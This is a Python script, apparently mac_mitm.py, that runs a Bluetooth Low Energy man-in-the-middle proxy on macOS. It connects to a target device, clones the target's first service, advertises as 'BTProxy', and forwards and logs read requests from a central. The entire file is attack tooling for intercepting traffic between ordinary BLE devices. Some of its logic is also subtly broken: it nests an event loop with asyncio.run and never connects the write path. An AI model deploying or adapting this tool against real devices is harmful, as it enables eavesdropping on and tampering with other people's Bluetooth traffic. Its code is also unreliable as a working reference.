import asyncio
import logging
from bleak import BleakClient
from bleak.exc import BleakError
try:
    import objc
except Exception:  # pragma: no cover - missing pyobjc
    objc = None
from typing import TYPE_CHECKING

try:
    from Foundation import NSObject
except Exception:  # pragma: no cover - fallback when pyobjc missing
    class NSObject:  # type: ignore[misc]
        pass

if TYPE_CHECKING:
    from CoreBluetooth import CBPeripheralManager  # pragma: no cover

# Import CoreBluetooth classes via pyobjc if available
if objc is not None and hasattr(objc, "loadBundle"):
    objc.loadBundle(
        "CoreBluetooth",
        globals(),
        bundle_path="/System/Library/Frameworks/CoreBluetooth.framework",
    )

# Renamed delegate to avoid conflict with Bleak's PeripheralDelegate.
class MITMPeripheralDelegate(NSObject):
    # This delegate intercepts BLE events from the central.
    def initWithMITMProxy_(self, proxy):
        objc_super = getattr(objc, "super", super)
        self = objc_super(MITMPeripheralDelegate, self).init()
        if self is None:
            return None
        self.proxy = proxy
        return self

    # Example method: called when a read request is received from the central.
    def peripheralManager_didReceiveReadRequest_(self, peripheralManager, request):
        logging.info("Intercepted Read Request on Characteristic: %s", request.characteristic.UUID())
        # Forward the read to the actual target device via proxy method.
        data = self.proxy.forward_read(request.characteristic.UUID().UUIDString())
        request.value = data
        peripheralManager.respondToRequest_withResult_(request, 0)  # 0 for success

    # Additional delegate methods can be defined here.

# MITM Proxy Class
class MacMITMProxy:
    def __init__(self, target_address):
        self.target_address = target_address
        self.client = BleakClient(target_address)
        self.target_services = None
        # Setup logging
        logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(message)s")
        self.peripheral_manager = None

    async def connect_to_target(self, max_retries=3, retry_delay=2):
        for attempt in range(1, max_retries + 1):
            try:
                await self.client.connect()
                if self.client.is_connected:
                    print(f"Connected to target on attempt {attempt}.")
                    return
                else:
                    print(f"Attempt {attempt}: Not connected after connect().")
            except BleakError as e:
                print(f"Attempt {attempt}: BleakError: {e}")
            except Exception as e:
                print(f"Attempt {attempt}: Unexpected error: {e}")
            if attempt < max_retries:
                print(f"Retrying in {retry_delay} seconds...")
                await asyncio.sleep(retry_delay)
        raise BleakError(f"Failed to connect to target after {max_retries} attempts.")

    def setup_peripheral_manager(self):
        """Create a peripheral manager mirroring the target's services."""
        try:
            from CoreBluetooth import (
                CBPeripheralManager,
                CBUUID,
                CBMutableService,
                CBMutableCharacteristic,
                CBCharacteristicPropertyRead,
                CBCharacteristicPropertyWrite,
                CBAttributePermissionsReadable,
                CBAttributePermissionsWriteable,
                CBAdvertisementDataLocalNameKey,
                CBAdvertisementDataServiceUUIDsKey,
            )
        except Exception:  # pragma: no cover - missing pyobjc
            logging.info("CoreBluetooth not available; running without advertising")
            return None

        manager = CBPeripheralManager.alloc().initWithDelegate_queue_options_(None, None, None)
        delegate = MITMPeripheralDelegate.alloc().initWithMITMProxy_(self)
        manager.setDelegate_(delegate)

        if not self.target_services:
            return manager

        first_service = next(iter(self.target_services), None)
        if not first_service:
            return manager

        m_service = CBMutableService.alloc().initWithType_primary_(CBUUID.UUIDWithString_(first_service.uuid), True)
        m_chars = []
        for char in first_service.characteristics:
            props = CBCharacteristicPropertyRead | CBCharacteristicPropertyWrite
            perms = CBAttributePermissionsReadable | CBAttributePermissionsWriteable
            m_char = CBMutableCharacteristic.alloc().initWithType_properties_value_permissions_(
                CBUUID.UUIDWithString_(char.uuid), props, None, perms
            )
            m_chars.append(m_char)
        m_service.setCharacteristics_(m_chars)
        manager.addService_(m_service)

        adv_data = {
            CBAdvertisementDataLocalNameKey: "BTProxy",
            CBAdvertisementDataServiceUUIDsKey: [CBUUID.UUIDWithString_(first_service.uuid)],
        }
        manager.startAdvertising_(adv_data)
        logging.info("Started peripheral advertising as proxy for target")
        return manager

    def forward_read(self, char_uuid):
        # Forward a read request from the central to the target peripheral.
        try:
            if not self.target_services:
                return b""
            # Find the corresponding characteristic in the target services.
            for service in self.target_services:
                for char in service.characteristics:
                    if char.uuid == char_uuid:
                        data = asyncio.run(self.client.read_gatt_char(char_uuid))
                        logging.info("Forwarded read from target: %s", data)
                        return data
        except Exception as e:
            logging.error("Error forwarding read: %s", e)
        return b""

    async def forward_write(self, char_uuid, data):
        # Forward a write request to the target peripheral.
        try:
            await self.client.write_gatt_char(char_uuid, data)
            logging.info("Forwarded write to target on %s: %s", char_uuid, data)
        except Exception as e:
            logging.error("Error forwarding write: %s", e)

    async def run(self):
        try:
            await self.connect_to_target()
            self.target_services = await self.client.get_services()
            self.peripheral_manager = self.setup_peripheral_manager()
        except BleakError as e:
            print(f"Could not connect to target: {e}")
            return
        try:
            while True:
                await asyncio.sleep(1)
        except KeyboardInterrupt:
            logging.info("MITM Proxy shutting down.")
            await self.client.disconnect()
            # Stop advertising as needed.

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python3 mac_mitm.py <target_device_address>")
        sys.exit(1)
    target_address = sys.argv[1]
    mitm_proxy = MacMITMProxy(target_address)
    asyncio.run(mitm_proxy.run())
